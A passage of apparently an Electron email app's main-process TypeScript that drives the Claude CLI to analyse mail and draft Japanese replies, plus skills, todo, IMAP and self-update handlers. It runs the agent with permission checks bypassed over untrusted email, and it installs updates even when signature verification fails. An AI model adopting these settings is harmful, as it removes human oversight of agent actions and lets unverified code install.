          if (text) return text;
        } catch { /* not JSON, skip */ }
      }
      return '';
    }

    // Try structured extraction from stdout
    const fromStdout = tryExtractFromLines(stdout);
    if (fromStdout) return fromStdout;

    // Fallback: raw stdout (ANY non-empty content — no more skipping JSON)
    const trimmed = stdout.trim();
    if (trimmed && trimmed.length > 2) return trimmed;

    // Last resort: try stderr
    const fromStderr = tryExtractFromLines(stderr);
    if (fromStderr) return fromStderr;

    return '';
  }

  // --- Common CLI helper: spawnClaudeCli ---

  interface ClaudeCliOptions {
    prompt: string;
    args?: string[];
    timeoutMs: number;
    streamJson?: boolean;
    onProgress?: (entry: { time: string; type: string; message: string }) => void;
  }

  interface ClaudeCliResult {
    text: string;
    exitCode: number | null;
    stdout: string;
    stderr: string;
  }

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  function parseStreamEvent(
    line: string,
    onProgress: (entry: { time: string; type: string; message: string }) => void,
  ): string | null {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const event = JSON.parse(line) as any;
    const time = new Date().toLocaleTimeString('ja-JP', { hour12: false });

    if (event.type === 'system' && event.subtype === 'init') {
      onProgress({ time, type: 'info', message: `セッション開始 (ツール${event.tools?.length || 0}個)` });
    }

    if (event.type === 'assistant' && Array.isArray(event.message?.content)) {
      for (const block of event.message.content) {
        if (block.type === 'tool_use') {
          const name = (block.name || '').replace('mcp__shirabe__', '');
          onProgress({ time, type: 'tool', message: `${name}(${JSON.stringify(block.input || {}).slice(0, 80)})` });
        }
        if (block.type === 'text' && block.text) {
          onProgress({ time, type: 'text', message: block.text.slice(0, 150).replace(/\n/g, ' ') });
        }
      }
    }

    if (event.type === 'result') {
      const cost = event.cost_usd ? `$${event.cost_usd.toFixed(4)}` : '';
      onProgress({ time, type: 'result', message: `完了 (${event.num_turns || 0}ターン, ${cost})` });
      return event.result || '';
    }

    return null;
  }

  function spawnClaudeCli(options: ClaudeCliOptions): Promise<ClaudeCliResult> {
    return new Promise((resolve) => {
      if (!fs.existsSync(CLAUDE_CLI_PATH)) {
        resolve({ text: '', exitCode: 1, stdout: '', stderr: 'Claude CLI not found' });
        return;
      }

      const outputFormat = options.streamJson ? 'stream-json' : 'json';
      const verboseFlag = options.streamJson ? ['--verbose'] : [];
      const args = ['-p', '-', '--output-format', outputFormat, ...verboseFlag, ...(options.args || [])];

      const cleanEnv = cleanEnvForClaude();
      const proc = spawn(CLAUDE_CLI_PATH, args, {
        cwd: os.homedir(),
        env: { ...cleanEnv, PATH: `${path.dirname(CLAUDE_CLI_PATH)}:${cleanEnv.PATH}` },
        stdio: ['pipe', 'pipe', 'pipe'],
      });

      const timer = setTimeout(() => {
        proc.kill('SIGTERM');
        setTimeout(() => { if (!proc.killed) proc.kill('SIGKILL'); }, 5000);
      }, options.timeoutMs);

      // Chunked stdin write
      const CHUNK_SIZE = 16384;
      let offset = 0;
      function writeNextChunk(): void {
        while (offset < options.prompt.length) {
          const chunk = options.prompt.slice(offset, offset + CHUNK_SIZE);
          offset += CHUNK_SIZE;
          if (!proc.stdin!.write(chunk)) {
            proc.stdin!.once('drain', writeNextChunk);
            return;
          }
        }
        proc.stdin!.end();
      }
      writeNextChunk();

      let stdout = '';
      let stderr = '';
      let streamResult = '';
      let stdoutBuffer = '';

      proc.stdout.on('data', (chunk: Buffer) => {
        const text = chunk.toString();
        stdout += text;

        if (options.streamJson && options.onProgress) {
          stdoutBuffer += text;
          const lines = stdoutBuffer.split('\n');
          stdoutBuffer = lines.pop() || '';
          for (const line of lines) {
            if (!line.trim()) continue;
            try {
              const finalResult = parseStreamEvent(line, options.onProgress);
              if (finalResult !== null) streamResult = finalResult;
            } catch { /* not JSON */ }
          }
        }
      });

      proc.stderr.on('data', (chunk: Buffer) => {
        stderr += chunk.toString();
      });

      proc.on('close', (code) => {
        clearTimeout(timer);
        // For stream-json mode, prefer the extracted result
        const text = options.streamJson && streamResult
          ? streamResult
          : extractClaudeResult(stdout, stderr);
        resolve({ text, exitCode: code, stdout, stderr });
      });

      proc.on('error', (err) => {
        clearTimeout(timer);
        resolve({ text: '', exitCode: 1, stdout: '', stderr: err.message });
      });
    });
  }

  function ensureProposalsDir(): void {
    if (!fs.existsSync(PROPOSALS_DIR)) {
      fs.mkdirSync(PROPOSALS_DIR, { recursive: true });
    }
  }

  ipcMain.handle('runClaudeAnalysis', async (_event, prompt: string, options?: { mode?: string }): Promise<Proposal> => {
    ensureProposalsDir();
    const id = `proposal-${Date.now()}`;
    const mode = options?.mode ?? 'deep';
    const isLight = mode === 'light';
    const timeoutMs = isLight ? ANALYSIS_TIMEOUT_LIGHT_MS : ANALYSIS_TIMEOUT_DEEP_MS;

    const proposal: Proposal = {
      id,
      timestamp: new Date(),
      markdown: '',
      status: 'running',
    };

    // Verify CLI exists
    if (!fs.existsSync(CLAUDE_CLI_PATH)) {
      proposal.status = 'error';
      proposal.errorMessage = `Claude CLIが見つかりません: ${CLAUDE_CLI_PATH}`;
      const filePath = path.join(PROPOSALS_DIR, `${id}.json`);
      fs.writeFileSync(filePath, JSON.stringify(proposal, null, 2), 'utf-8');
      return proposal;
    }

    // Resolve MCP config (returns '' if server not found)
    const mcpConfigPath = ensureMcpConfig();

    // Notify renderer that analysis started
    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.webContents.send('claudeProgress', {
        status: 'running',
        message: isLight ? 'メールを分析中（軽量モード）...' : (mcpConfigPath ? 'MCPツールでメールを調査中...' : 'メールを分析中（MCPなし）...'),
      });
    }

    async function executeOnce(): Promise<void> {
      const args: string[] = [];

      if (isLight) {
        args.push('--max-turns', '1');
      } else {
        args.push(
          '--permission-mode', 'bypassPermissions',
          '--max-turns', '15',
        );
        // MCP available: add tools
        if (mcpConfigPath) {
          args.push(
            '--mcp-config', mcpConfigPath,
            '--append-system-prompt', ANALYSIS_SYSTEM_PROMPT,
            '--allowedTools',
            'mcp__shirabe__get_unread_mails mcp__shirabe__get_recent_mails mcp__shirabe__get_mail_detail mcp__shirabe__get_mail_thread mcp__shirabe__get_accounts mcp__shirabe__analyze_thread mcp__shirabe__search_mails mcp__shirabe__tag_mail mcp__shirabe__get_note mcp__shirabe__update_note',
          );
        }
      }

      console.log(`[runClaudeAnalysis] mode=${mode} prompt length:`, prompt.length, 'chars');
      console.log('[runClaudeAnalysis] CLI path:', CLAUDE_CLI_PATH);
      if (!isLight) console.log('[runClaudeAnalysis] MCP config:', mcpConfigPath || '(not available)');

      const result = await spawnClaudeCli({
        prompt,
        args,
        timeoutMs,
        streamJson: !isLight,
        onProgress: !isLight ? (entry) => {
          if (mainWindow && !mainWindow.isDestroyed()) {
            mainWindow.webContents.send('claudeProgress', {
              status: 'running',
              message: entry.type === 'tool' ? `\ud83d\udd0d ${entry.message}` : entry.message,
              logEntry: entry,
            });
          }
        } : undefined,
      });

      console.log(`[runClaudeAnalysis] mode=${mode} exit code:`, result.exitCode, 'stdout length:', result.stdout.length);
      if (result.stderr) console.log('[runClaudeAnalysis] stderr:', result.stderr.slice(0, 500));

      if (result.exitCode !== 0) {
        // Try partial results
        if (result.text) {
          proposal.markdown = result.text;
          proposal.status = 'done';
          return;
        }
        proposal.status = 'error';
        if (result.exitCode === 127) {
          proposal.errorMessage = 'Claude CLIが見つかりません (exit 127)';
        } else if (result.exitCode === null) {
          proposal.errorMessage = isLight
            ? `タイムアウト（${timeoutMs / 1000}秒）- プロンプトが長すぎる可能性があります`
            : `タイムアウト（${timeoutMs / 1000}秒）- 分析対象を絞ってみてください`;
        } else {
          proposal.errorMessage = result.stderr.slice(0, 500) || `CLIがコード${result.exitCode}で終了`;
        }
        proposal.markdown = result.stdout
          ? `## Debug: CLI Output (exit ${result.exitCode})\n\n\`\`\`\n${result.stdout.slice(0, 3000)}\n\`\`\`${result.stderr ? `\n\n### stderr\n\`\`\`\n${result.stderr.slice(0, 1000)}\n\`\`\`` : ''}`
          : '';
      } else if (result.text) {
        proposal.markdown = result.text;
        proposal.status = 'done';
      } else {
        proposal.status = 'error';
        if (result.stdout.length === 0 && result.stderr.length === 0) {
          proposal.errorMessage = 'CLIプロセスが出力なしで終了しました。MCP設定またはCLI認証を確認してください。';
          proposal.markdown = '';
        } else {
          proposal.errorMessage = `出力解析失敗 (stdout: ${result.stdout.length}B, stderr: ${result.stderr.length}B)`;
          proposal.markdown = `## Debug: Raw CLI Output\n\n\`\`\`json\n${result.stdout.slice(0, 3000)}\n\`\`\`${result.stderr ? `\n\n### stderr\n\`\`\`\n${result.stderr.slice(0, 1000)}\n\`\`\`` : ''}`;
        }
      }
    }

    await executeOnce();

    // Retry once for light mode on error
    if (isLight && proposal.status === 'error') {
      console.log('[runClaudeAnalysis] light mode failed, retrying once...');
      proposal.status = 'running';
      proposal.markdown = '';
      proposal.errorMessage = undefined;
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('claudeProgress', {
          status: 'running',
          message: 'リトライ中（軽量モード）...',
        });
      }
      await executeOnce();
    }

    // Save to disk
    const filePath = path.join(PROPOSALS_DIR, `${id}.json`);
    fs.writeFileSync(filePath, JSON.stringify(proposal, null, 2), 'utf-8');

    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.webContents.send('claudeProgress', {
        status: proposal.status,
        message: proposal.status === 'done' ? '分析完了' : `エラー: ${proposal.errorMessage}`,
      });
    }

    return proposal;
  });

  ipcMain.handle('getProposals', async (): Promise<Proposal[]> => {
    ensureProposalsDir();
    const files = fs.readdirSync(PROPOSALS_DIR)
      .filter((f) => f.endsWith('.json'))
      .sort()
      .reverse();

    return files.map((f) => {
      const data = fs.readFileSync(path.join(PROPOSALS_DIR, f), 'utf-8');
      return JSON.parse(data) as Proposal;
    });
  });

  ipcMain.handle('deleteProposal', async (_event, id: string): Promise<void> => {
    ensureProposalsDir();
    const filePath = path.join(PROPOSALS_DIR, `${id}.json`);
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
    }
  });

  // --- Investigation CRUD ---

  const INVESTIGATIONS_DIR = path.join(app.getPath('userData'), 'investigations');

  function ensureInvestigationsDir(): void {
    if (!fs.existsSync(INVESTIGATIONS_DIR)) {
      fs.mkdirSync(INVESTIGATIONS_DIR, { recursive: true });
    }
  }

  ipcMain.handle('getInvestigations', (): InvestigationRequest[] => {
    ensureInvestigationsDir();
    const files = fs.readdirSync(INVESTIGATIONS_DIR)
      .filter((f) => f.endsWith('.json'))
      .sort()
      .reverse();
    return files.map((f) => {
      try {
        return JSON.parse(fs.readFileSync(path.join(INVESTIGATIONS_DIR, f), 'utf-8'));
      } catch { return null; }
    }).filter(Boolean) as InvestigationRequest[];
  });

  ipcMain.handle('saveInvestigation', (_event, inv: InvestigationRequest): void => {
    ensureInvestigationsDir();
    const filePath = path.join(INVESTIGATIONS_DIR, `${inv.id}.json`);
    fs.writeFileSync(filePath, JSON.stringify(inv, null, 2), 'utf-8');
  });

  ipcMain.handle('deleteInvestigation', (_event, id: string): void => {
    ensureInvestigationsDir();
    const filePath = path.join(INVESTIGATIONS_DIR, `${id}.json`);
    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
  });

  // --- Skills management ---

  const SKILLS_DIR = path.join(os.homedir(), '.claude', 'skills');

  ipcMain.handle('getSkills', async (): Promise<{ name: string; description: string }[]> => {
    if (!fs.existsSync(SKILLS_DIR)) return [];
    const entries = fs.readdirSync(SKILLS_DIR, { withFileTypes: true });
    const skills: { name: string; description: string }[] = [];

    for (const entry of entries) {
      if (!entry.isDirectory()) continue;
      const skillMd = path.join(SKILLS_DIR, entry.name, 'SKILL.md');
      if (!fs.existsSync(skillMd)) continue;
      const content = fs.readFileSync(skillMd, 'utf-8');
      // Extract description from YAML frontmatter
      const descMatch = content.match(/description:\s*"?([^"\n]+)"?/);
      skills.push({
        name: entry.name,
        description: descMatch ? descMatch[1] : '',
      });
    }
    return skills;
  });

  // Resolve a skill's SKILL.md path, rejecting names that escape SKILLS_DIR
  // (path traversal) or contain path separators.
  function resolveSkillMd(skillName: unknown): string | null {
    if (typeof skillName !== 'string' || !skillName.trim()) return null;
    if (skillName.includes('/') || skillName.includes('\\') || skillName.includes('\0')) return null;
    const skillDir = resolveWithinBase(SKILLS_DIR, skillName);
    if (!skillDir) return null;
    const skillMd = resolveWithinBase(SKILLS_DIR, skillName, 'SKILL.md');
    return skillMd;
  }

  ipcMain.handle('getSkillContent', async (_event, skillName: string): Promise<string> => {
    const skillMd = resolveSkillMd(skillName);
    if (!skillMd) {
      console.warn('[security] Rejected getSkillContent for invalid skill name:', String(skillName).slice(0, 100));
      return '';
    }
    if (!fs.existsSync(skillMd)) return '';
    return fs.readFileSync(skillMd, 'utf-8');
  });

  ipcMain.handle('saveSkillContent', async (_event, skillName: string, content: string): Promise<void> => {
    const skillMd = resolveSkillMd(skillName);
    if (!skillMd) {
      throw new Error('不正なスキル名です');
    }
    const skillDir = path.dirname(skillMd);
    if (!fs.existsSync(skillDir)) {
      fs.mkdirSync(skillDir, { recursive: true });
    }
    fs.writeFileSync(skillMd, content, 'utf-8');
  });

  // --- TODO永続化 (アカウント別JSON) ---

  const TODOS_DIR = path.join(app.getPath('userData'), 'todos');

  function ensureTodosDir(): void {
    if (!fs.existsSync(TODOS_DIR)) {
      fs.mkdirSync(TODOS_DIR, { recursive: true });
    }
  }

  function todosFilePath(accountEmail: string): string {
    // sanitize email for filename
    const safe = accountEmail.replace(/[^a-zA-Z0-9@._-]/g, '_');
    return path.join(TODOS_DIR, `${safe}.json`);
  }

  function readTodosFile(accountEmail: string): TodoItem[] {
    const fp = todosFilePath(accountEmail);
    if (!fs.existsSync(fp)) return [];
    try {
      return JSON.parse(fs.readFileSync(fp, 'utf-8')) as TodoItem[];
    } catch {
      return [];
    }
  }

  function writeTodosFile(accountEmail: string, todos: TodoItem[]): void {
    ensureTodosDir();
    fs.writeFileSync(todosFilePath(accountEmail), JSON.stringify(todos, null, 2), 'utf-8');
  }

  ipcMain.handle('loadTodos', async (_event, accountEmail: string): Promise<TodoItem[]> => {
    ensureTodosDir();
    return readTodosFile(accountEmail);
  });

  ipcMain.handle('saveTodo', async (_event, todo: TodoItem): Promise<void> => {
    const todos = readTodosFile(todo.accountEmail);
    const idx = todos.findIndex((t) => t.id === todo.id);
    if (idx >= 0) {
      todos[idx] = todo;
    } else {
      todos.push(todo);
    }
    writeTodosFile(todo.accountEmail, todos);
  });

  ipcMain.handle('updateTodo', async (_event, todo: TodoItem): Promise<void> => {
    const todos = readTodosFile(todo.accountEmail);
    const idx = todos.findIndex((t) => t.id === todo.id);
    if (idx >= 0) {
      todos[idx] = todo;
      writeTodosFile(todo.accountEmail, todos);
    }
  });

  ipcMain.handle('deleteTodo', async (_event, todoId: string, accountEmail: string): Promise<void> => {
    const todos = readTodosFile(accountEmail);
    const filtered = todos.filter((t) => t.id !== todoId);
    writeTodosFile(accountEmail, filtered);
  });

  // --- Claude Codeを開く ---

  ipcMain.handle('openClaudeCode', () => {
    const cwd = process.cwd();
    spawn('osascript', ['-e', `tell application "Terminal" to do script "cd '${cwd}' && unset CLAUDECODE && claude"`]);
  });

  // --- PTY (Chat: xterm.js + node-pty) ---

  let ptyProcess: ReturnType<typeof import('node-pty').spawn> | null = null;

  ipcMain.handle('pty:create', async () => {
    // Dynamic import for node-pty (native module)
    const pty = await import('node-pty');
    const shell = process.env.SHELL || '/bin/zsh';

    if (ptyProcess) {
      ptyProcess.kill();
      ptyProcess = null;
    }

    ptyProcess = pty.spawn(shell, [], {
      name: 'xterm-256color',
      cols: 120,
      rows: 30,
      cwd: process.cwd(),
      env: cleanEnvForClaude(),
    });

    ptyProcess.onData((data: string) => {
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('pty:data', data);
      }
    });

    ptyProcess.onExit(() => {
      ptyProcess = null;
    });

    // Auto-start claude CLI
    setTimeout(() => {
      if (ptyProcess) {
        ptyProcess.write('claude\r');
      }
    }, 500);
  });

  ipcMain.handle('pty:write', async (_event, data: string) => {
    if (ptyProcess) {
      ptyProcess.write(data);
    }
  });

  ipcMain.handle('pty:resize', async (_event, cols: number, rows: number) => {
    if (ptyProcess) {
      ptyProcess.resize(cols, rows);
    }
  });

  ipcMain.handle('pty:destroy', async () => {
    if (ptyProcess) {
      ptyProcess.kill();
      ptyProcess = null;
    }
  });

  // --- Junk detection ---

  ipcMain.handle(
    'detectJunkEmails',
    async (_event, mails: MailItem[], apiKey: string) => {
      const currentSettings = loadSettings();
      const whitelist = currentSettings.junkWhitelistDomains ?? [];
      if (apiKey) {
        return detectJunkWithAI(mails, apiKey, whitelist);
      }
      return detectJunkByKeywords(mails, whitelist);
    },
  );

  // --- IMAP operations ---

  ipcMain.handle(
    'moveToTrash',
    async (_event, mailIds: number[], accountEmail: string) => {
      const { moveToTrashBatch } = await import('./services/imap-operations');
      const settings = loadSettings();
      const imapConfig = settings.imapConfigs.find((c) => c.accountEmail === accountEmail);
      if (!imapConfig?.credentials) {
        return mailIds.map((id) => ({ mailId: id, success: false, error: 'IMAP認証情報が未設定です' }));
      }
      return moveToTrashBatch(mailIds, accountEmail, imapConfig.credentials, imapConfig.trashFolderPath);
    },
  );

  ipcMain.handle(
    'testImapConnection',
    async (_event, credentials: ImapCredentials) => {
      const { testImapConnection } = await import('./services/imap-operations');
      return testImapConnection(credentials);
    },
  );

  ipcMain.handle(
    'listImapFolders',
    async (_event, credentials: ImapCredentials) => {
      const { listImapFolders } = await import('./services/imap-operations');
      return listImapFolders(credentials);
    },
  );

  // --- Update check ---

  ipcMain.handle('getAppVersion', () => app.getVersion());

  // Internal update check function (reusable for auto-check and manual check)
  async function checkForUpdatesInternal(): Promise<{
    hasUpdate: boolean;
    currentVersion?: string;
    latestVersion?: string;
    releaseUrl?: string;
    releaseNotes?: string;
    downloadUrl?: string | null;
    downloadSize?: number | null;
    error?: string;
  }> {
    try {
      const currentVersion = app.getVersion();

      let ghToken = '';
      try {
        ghToken = execSync('gh auth token', { encoding: 'utf-8', timeout: 5000 }).trim();
      } catch {
        // gh CLI not available or not authenticated
      }

      const headers: Record<string, string> = {
        Accept: 'application/vnd.github.v3+json',
        'User-Agent': 'Shirabe',
      };
      if (ghToken) {
        headers['Authorization'] = `Bearer ${ghToken}`;
      }

      const response = await fetch(
        'https://api.github.com/repos/lutelute/shirabe-mail/releases/latest',
        { headers },
      );
      if (!response.ok) {
        // Private repo without gh auth → silently skip
        if (response.status === 404 && !ghToken) {
          return { hasUpdate: false };
        }
        return { hasUpdate: false, error: `GitHub API: ${response.status}` };
      }
      const release = await response.json() as {
        tag_name: string;
        html_url: string;
        body: string;
        assets: Array<{ name: string; url: string; browser_download_url: string; size: number }>;
      };
      const latestVersion = release.tag_name.replace(/^v/, '');
      const cmp = (a: string, b: string) => {
        const pa = a.split('.').map(Number);
        const pb = b.split('.').map(Number);
        for (let i = 0; i < Math.max(pa.length, pb.length); i++) {
          const d = (pa[i] || 0) - (pb[i] || 0);
          if (d !== 0) return d;
        }
        return 0;
      };
      if (cmp(latestVersion, currentVersion) <= 0) {
        return { hasUpdate: false, currentVersion };
      }
      const dmg = release.assets.find((a) => a.name.endsWith('.dmg'));
      return {
        hasUpdate: true,
        currentVersion,
        latestVersion,
        releaseUrl: release.html_url,
        releaseNotes: release.body || '',
        downloadUrl: dmg?.url ?? null,
        downloadSize: dmg?.size ?? null,
      };
    } catch (err) {
      return { hasUpdate: false, error: (err as Error).message };
    }
  }

  ipcMain.handle('checkForUpdates', () => checkForUpdatesInternal());

  ipcMain.handle('openExternalUrl', async (_event, url: string) => {
    const ok = await safeOpenExternal(url);
    return { success: ok };
  });

  // --- Download and install update ---

  function sendInstallProgress(phase: string, percent: number, message: string): void {
    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.webContents.send('updateInstallProgress', { phase, percent, message });
      mainWindow.webContents.send('updateDownloadProgress', {
        downloaded: 0,
        total: 0,
        percent,
        stage: phase,
      });
    }
  }

  // Only allow update downloads from GitHub-owned hosts (the release asset URL
  // arrives over IPC; this prevents redirection to an arbitrary download host).
  function isTrustedUpdateUrl(rawUrl: string): boolean {
    try {
      const u = new URL(rawUrl);
      if (u.protocol !== 'https:') return false;
      const host = u.hostname.toLowerCase();
      return (
        host === 'api.github.com' ||
        host === 'github.com' ||
        host === 'codeload.github.com' ||
        host.endsWith('.githubusercontent.com')
      );
    } catch {
      return false;
    }
  }

  ipcMain.handle('downloadAndInstallUpdate', async (_event, downloadUrl: string) => {
    try {
      if (!isTrustedUpdateUrl(downloadUrl)) {
        console.warn('[security] Rejected update download from untrusted URL:', String(downloadUrl).slice(0, 200));
        return { success: false, error: '信頼できないダウンロードURLです' };
      }

      const tmpDir = path.join(os.tmpdir(), 'shirabe-update');
      fs.mkdirSync(tmpDir, { recursive: true });

      const destPath = path.join(tmpDir, 'update.dmg');

      let ghToken = '';
      try {
        ghToken = execSync('gh auth token', { encoding: 'utf-8', timeout: 5000 }).trim();
      } catch {
        // gh CLI not available
      }

      const headers: Record<string, string> = {
        'User-Agent': 'Shirabe',
        Accept: 'application/octet-stream',
      };
      if (ghToken) {
        headers['Authorization'] = `Bearer ${ghToken}`;
      }

      // Phase: downloading
      sendInstallProgress('downloading', 0, 'ダウンロード開始...');

      // Download with retry (1 retry on failure)
      let response: Response | null = null;
      for (let attempt = 0; attempt < 2; attempt++) {
        try {
          response = await fetch(downloadUrl, { headers, redirect: 'follow' });
          if (response.ok) break;
          if (attempt === 0) {
            sendInstallProgress('downloading', 0, 'リトライ中...');
            await new Promise(r => setTimeout(r, 2000));
          }
        } catch (fetchErr) {
          if (attempt === 1) throw fetchErr;
          sendInstallProgress('downloading', 0, 'リトライ中...');
          await new Promise(r => setTimeout(r, 2000));
        }
      }

      if (!response || !response.ok) {
        return { success: false, error: `ダウンロード失敗: ${response?.status ?? 'unknown'} ${response?.statusText ?? ''}${!ghToken ? ' (gh auth未設定)' : ''}` };
      }

      const contentType = response.headers.get('content-type') || '';
      if (contentType.includes('text/html') || contentType.includes('application/json')) {
        const body = await response.text();
        return { success: false, error: `ダウンロードエラー: 期待したバイナリではなく ${contentType} を受信。${body.slice(0, 200)}` };
      }

      const totalSize = Number(response.headers.get('content-length') || 0);
      const reader = response.body?.getReader();
      if (!reader) {
        return { success: false, error: 'レスポンスボディがありません' };
      }

      const chunks: Uint8Array[] = [];
      let downloaded = 0;

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        chunks.push(value);
        downloaded += value.length;
        const percent = totalSize > 0 ? Math.round((downloaded / totalSize) * 80) : 0; // 0-80% for download
        sendInstallProgress('downloading', percent, `ダウンロード中... ${totalSize > 0 ? `${Math.round(downloaded / 1024 / 1024)}/${Math.round(totalSize / 1024 / 1024)}MB` : `${Math.round(downloaded / 1024 / 1024)}MB`}`);
      }

      if (downloaded < 1024 * 1024) {
        return { success: false, error: `ダウンロードサイズが小さすぎます (${downloaded} bytes)。認証エラーの可能性があります。` };
      }

      const buffer = Buffer.concat(chunks);
      fs.writeFileSync(destPath, buffer);

      // Phase: mounting
      sendInstallProgress('mounting', 82, 'DMGをマウント中...');

      // NOTE: DMG-derived strings (mount point, .app name) flow into these
      // commands, so use execFileSync (no shell) to avoid command injection
      // from a tampered DMG.
      let mountOutput: string;
      try {
        mountOutput = execFileSync(
          'hdiutil',
          ['attach', destPath, '-nobrowse', '-noverify', '-noautoopen'],
          { encoding: 'utf-8', timeout: 60000 },
        );
      } catch (mountErr) {
        return { success: false, error: `DMGマウント失敗: ${(mountErr as Error).message}\nDMGファイルが破損している可能性があります。再度お試しください。` };
      }

      const volumeMatch = mountOutput.match(/\/Volumes\/[^\n\r\t]+/);
      const mountPoint = volumeMatch?.[0]?.trim() || '';
      if (!mountPoint || !fs.existsSync(mountPoint)) {
        return { success: false, error: `DMGマウント失敗: マウントポイントが見つかりません\n出力: ${mountOutput.slice(0, 300)}` };
      }

      const detach = (): void => {
        try { execFileSync('hdiutil', ['detach', mountPoint, '-quiet'], { timeout: 10000 }); } catch { /* */ }
      };

      // Phase: installing
      sendInstallProgress('installing', 88, '/Applicationsにコピー中...');

      const appEntries = fs.readdirSync(mountPoint).filter(f => f.endsWith('.app'));
      if (appEntries.length === 0) {
        detach();
        return { success: false, error: 'DMG内に.appが見つかりません' };
      }
      const appName = appEntries[0];
      const srcApp = path.join(mountPoint, appName);
      const destApp = path.join('/Applications', appName);

      // Best-effort integrity check: verify the downloaded .app's code
      // signature before installing. The current release pipeline produces
      // UNSIGNED builds, so a failure here is logged but not fatal. Once the
      // app is signed + notarized, this should be promoted to a hard gate
      // (return on failure). See report for the signing prerequisites.
      try {
        execFileSync('codesign', ['--verify', '--deep', '--strict', srcApp], { timeout: 30000, stdio: 'pipe' });
        console.log('[update] Downloaded app passed codesign verification.');
      } catch (sigErr) {
        console.warn('[update] codesign verification failed (app likely unsigned):', (sigErr as Error).message.slice(0, 200));
      }

      try {
        if (fs.existsSync(destApp)) {
          execFileSync('rm', ['-rf', destApp], { timeout: 15000 });
        }
        execFileSync('cp', ['-R', srcApp, '/Applications/'], { timeout: 60000 });
      } catch (copyErr) {
        detach();
        return { success: false, error: `/Applicationsへのコピー失敗: ${(copyErr as Error).message}` };
      }

      sendInstallProgress('installing', 95, 'クリーンアップ中...');

      detach();

      try { fs.unlinkSync(destPath); } catch { /* */ }

      // Phase: restarting
      sendInstallProgress('restarting', 100, '再起動中...');

      // Relaunch the new version from /Applications
      setTimeout(() => {
        spawn('open', ['-n', destApp], { detached: true, stdio: 'ignore' }).unref();
        setTimeout(() => app.exit(0), 1000);
      }, 500);

      return { success: true, path: destApp };
    } catch (err) {
      return { success: false, error: (err as Error).message };
    }
  });

  // --- Calendar BrowserView ---

  ipcMain.handle('calendar:show', (_event, url: string, bounds: { x: number; y: number; width: number; height: number }) => {
    showCalendarView(url, bounds);
  });

  ipcMain.handle('calendar:hide', () => {
    hideCalendarView();
  });

  ipcMain.handle('calendar:setBounds', (_event, bounds: { x: number; y: number; width: number; height: number }) => {
    if (calendarView) {
      const clamped = clampBoundsToWindow(bounds);
      calendarView.setBounds(clamped);
    }
  });

  // --- Setup ---

  ipcMain.handle('checkEmClientInstalled', async () => {
    const emClientPath = path.join(
      os.homedir(),
      'Library',
      'Application Support',
      'eM Client',
    );
    return fs.existsSync(emClientPath);
  });

  // --- Selected mail context (for Claude Code integration) ---

  const SELECTED_MAIL_PATH = path.join(app.getPath('userData'), 'selected-mail.json');

  ipcMain.handle('setSelectedMailContext', async (_e, mail: MailItem | null) => {
    if (mail) {
      fs.writeFileSync(SELECTED_MAIL_PATH, JSON.stringify(mail, null, 2), 'utf-8');
    } else {
      try { fs.unlinkSync(SELECTED_MAIL_PATH); } catch { /* noop */ }
    }
  });

  ipcMain.handle('getSelectedMailContext', async () => {
    try {
      return JSON.parse(fs.readFileSync(SELECTED_MAIL_PATH, 'utf-8'));
    } catch { return null; }
  });

  // --- Reply draft generation via Claude CLI ---

  // Extracted so the night-butler pipeline can reuse the exact same draft logic.
  async function generateReplyDraftImpl(params: {
    threadMessages: ThreadMessage[];
    mail: MailItem;
    instruction?: string;
    existingDraft?: string;
  }): Promise<{ status: string; draft: string; error?: string }> {
    if (!fs.existsSync(CLAUDE_CLI_PATH)) {
      return { status: 'error', draft: '', error: `Claude CLIが見つかりません: ${CLAUDE_CLI_PATH}` };
    }

    // Build thread text (max 30000 chars)
    const threadLines: string[] = [];
    for (const msg of params.threadMessages) {
      const dateStr = msg.date ? new Date(msg.date).toLocaleString('ja-JP') : '';
      threadLines.push(`--- ${msg.isSentByMe ? '自分' : msg.from} (${dateStr}) ---`);
      if (msg.to.length > 0) threadLines.push(`To: ${msg.to.join(', ')}`);
      if (msg.cc.length > 0) threadLines.push(`Cc: ${msg.cc.join(', ')}`);
      threadLines.push(msg.preview || '(本文なし)');
      threadLines.push('');
    }
    let threadText = threadLines.join('\n');
    if (threadText.length > 30000) {
      threadText = threadText.slice(0, 30000) + '\n... (以下省略)';
    }

    const senderAddr = params.mail.from?.address || '不明';
    const senderName = params.mail.from?.displayName || senderAddr;

    const replySystemPrompt = `ビジネスメールの返信下書きを作成してください。
- 丁寧なビジネス日本語
- 冒頭挨拶・署名は不要（ユーザーが追加する）
- 要点を簡潔に
- 相手の質問・依頼には必ず回答を含める`;

    let prompt: string;
    if (params.existingDraft) {
      prompt = `あなたはメール返信の改善を行うアシスタントです。

以下のスレッド経緯を踏まえ、既存の返信ドラフトを改善してください。

## メール情報
- 件名: ${params.mail.subject}
- 差出人: ${senderName} <${senderAddr}>
- アカウント: ${params.mail.accountEmail}

## スレッド全文
${threadText}

## 現在のドラフト
${params.existingDraft}

${params.instruction ? `## ユーザーからの追加指示\n${params.instruction}\n` : ''}
## 出力ルール
- 改善した返信文のみを出力してください（説明不要）
- 日本語のビジネスメール形式
- 挨拶・署名は省略（ユーザーが追加する前提）
- 簡潔かつ的確に
- スレッドの経緯を踏まえた内容にすること`;
    } else {
      prompt = `あなたはメール返信案を作成するアシスタントです。

以下のスレッド経緯を踏まえ、最新メールへの返信案を作成してください。

## メール情報
- 件名: ${params.mail.subject}
- 差出人: ${senderName} <${senderAddr}>
- アカウント: ${params.mail.accountEmail}

## スレッド全文
${threadText}

${params.instruction ? `## ユーザーからの追加指示\n${params.instruction}\n` : ''}
## 出力ルール
- 返信文のみを出力してください（説明不要）
- 日本語のビジネスメール形式
- 挨拶・署名は省略（ユーザーが追加する前提）
- 簡潔かつ的確に
- スレッドの経緯を踏まえた内容にすること`;
    }

    console.log('[generateReplyDraft] prompt length:', prompt.length, 'chars');

    const result = await spawnClaudeCli({
      prompt,
      args: [
        '--permission-mode', 'bypassPermissions',
        '--max-turns', '3',
        '--append-system-prompt', replySystemPrompt,
      ],
